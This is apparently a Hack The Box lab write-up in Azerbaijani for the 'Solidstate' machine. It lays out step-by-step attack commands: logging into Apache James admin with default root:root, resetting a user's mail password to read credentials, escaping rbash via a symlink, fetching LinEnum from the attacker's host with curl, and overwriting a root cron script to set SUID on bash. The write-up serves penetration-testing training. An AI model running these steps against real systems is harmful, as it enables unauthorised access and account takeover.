# Solidstate (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Orta  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -sC -sV -A → 22 (SSH), 25 (SMTP), 80 (Apache 2.4.25), 110 (POP3), 119 (NNTP)
├── nmap -p- → 4555 (rsip / Apache James admin)
└── nc 10.129.1.53 4555 → root:root

İlkin Giriş (Apache James)
├── help → listusers → james, thomas, john, mindy, mailadmin
├── setpassword mindy writeup
├── telnet 10.129.1.53 110 → USER mindy / PASS writeup
├── LIST → RETR 2 → email from mailadmin
│   └── mindy:<PASSWORD> (SSH creds)
└── ssh mindy@10.129.1.53 → user.txt

Escaping rbash
├── cat /etc/passwd → mindy:/bin/rbash
├── ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
└── ssh mindy@10.129.1.53 → bash -ip

Səlahiyyətlərin Artırılması
├── LinEnum.sh → /opt/tmp.py (world-writable, root-owned)
├── cat /opt/tmp.py → os.system('rm -r /tmp/*')
├── nano /opt/tmp.py → replace with os.system('chmod +s /bin/bash')
├── wait (cron) → ls -la /bin/bash → -rwsr-sr-x
└── /bin/bash -ip → root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Debian 9 (stretch), Apache James 2.3.2 (SMTP/POP3/NNTP). James admin panelindəki root parolu default-dur. İstifadəçilər: james, thomas, john, mindy, mailadmin.

---

## Kəşfiyyat

### Port Skanı

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.1.53
```

| Port | Xidmət | Versiya                        |
|------|--------|--------------------------------|
| 22   | SSH    | OpenSSH 7.4p1 Debian 10+deb9u1 |
| 25   | SMTP   | (Apache James)                 |
| 80   | HTTP   | Apache httpd 2.4.25 (Debian)   |
| 110  | POP3   | (Apache James)                 |
| 119  | NNTP   | (Apache James)                 |

Tam skan:

```bash
sudo nmap -p- -T4 10.129.1.53
```

4555/tcp (rsip) portu açıqdır - Apache James admin interfeysi.

---

## İlkin Giriş

### Apache James admin

```bash
nc 10.129.1.53 4555
```

Giriş `root:root`. Sonra:

```
help
listusers
```

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

### mindy istifadəçisinin parolunun sıfırlanması

```
setpassword mindy writeup
```

### POP3 vasitəsilə poçtun oxunması

```bash
telnet 10.129.1.53 110
USER mindy
PASS writeup
LIST
RETR 2
```

mailadmin-dən məktub:

```
username: mindy
pass: <PASSWORD>
```

### SSH

```bash
ssh mindy@10.129.1.53
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

### rbash-dan çıxış

```bash
cat /etc/passwd
# mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
```

Simlink vasitəsilə yan keçmə:

```bash
ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
ssh mindy@10.129.1.53
ls -la bin
bash -ip
```

---

## Səlahiyyətlərin Artırılması

### LinEnum

```bash
python3 -m http.server 80  # on Kali
cd /dev/shm
curl 10.10.16.15/LinEnum.sh -o LinEnum.sh
bash LinEnum.sh -t
```

Tapıntı:

```
-rwxrwxrwx 1 root root 105 /opt/tmp.py
```

### /opt/tmp.py-nin analizi

```bash
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Skript cron vasitəsilə root kimi işə salınır, lakin hamı üçün yazıla biləndir.

### Məzmunun dəyişdirilməsi

```bash
nano /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod +s /bin/bash')
except:
     sys.exit()
```

Cron-u gözləyirik:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1265272 ... /bin/bash
```

### Root

```bash
/bin/bash -ip
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **4555 portunda Apache James admin** - default `root:root` istifadəçi siyahısına tam nəzarət verir və hər hansı istifadəçinin parolunu sıfırlamağa imkan verir.
- **E-poçt yazışmalarında parollar** - POP3 məktubun mətnini açıq şəkildə giriş məlumatları ilə birlikdə təqdim edir.
- **rbash simlink vasitəsilə yan keçir** - əgər `~/bin`-ə (və ya `$PATH`-dəki hər hansı qovluğa) yazma hüququ varsa, `/bin/bash`-a simlink yaratmaq məhdudiyyəti aradan qaldırır.
- **Cron tərəfindən root kimi işə salınan world-writable skriptlər** - ən birbaşa LPE vektoru: məzmunu dəyişdiririk, işə düşməsini gözləyirik, SUID binary əldə edirik.
